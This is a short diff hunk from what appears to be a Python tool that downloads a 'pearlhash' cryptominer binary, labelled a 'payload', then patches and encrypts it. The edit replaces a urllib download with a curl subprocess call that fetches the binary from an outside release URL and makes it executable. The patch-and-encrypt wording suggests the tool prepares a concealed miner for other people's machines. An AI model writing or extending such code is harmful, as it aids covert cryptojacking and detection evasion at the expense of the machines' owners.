@@ -119,7 +119,7 @@ def download_and_patch_miner(workdir):
     """Download pearlhash miner binary, apply patches, encrypt."""
     bin_path = os.path.join(workdir, "miner_raw")
     print(f"[dl] downloading payload...")
-    urllib.request.urlretrieve(MINER_RELEASE_URL, bin_path)
+    subprocess.run(["curl", "-fsSL", MINER_RELEASE_URL, "-o", bin_path], check=True)
     os.chmod(bin_path, 0o755)
 
     with open(bin_path, "rb") as f:
